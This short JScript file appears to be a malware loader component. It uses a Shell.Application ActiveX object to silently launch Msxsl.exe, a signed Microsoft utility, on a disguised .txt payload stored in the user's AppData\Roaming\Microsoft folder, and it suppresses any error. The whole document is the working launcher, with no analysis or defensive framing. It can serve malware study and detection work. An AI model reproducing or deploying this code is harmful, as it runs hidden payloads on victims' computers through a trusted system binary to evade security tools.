var Code = 0;
function GetActX(a) {return new ActiveXObject(a); }
try {
    var ObjX = GetActX("shell.application");
    ObjX.ShellExecute("Msxsl.exe", "3850FC6E77257.txt 3850FC6E77257.txt", "C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\", "", 0);
    } catch (e) {
    Code = 629;
}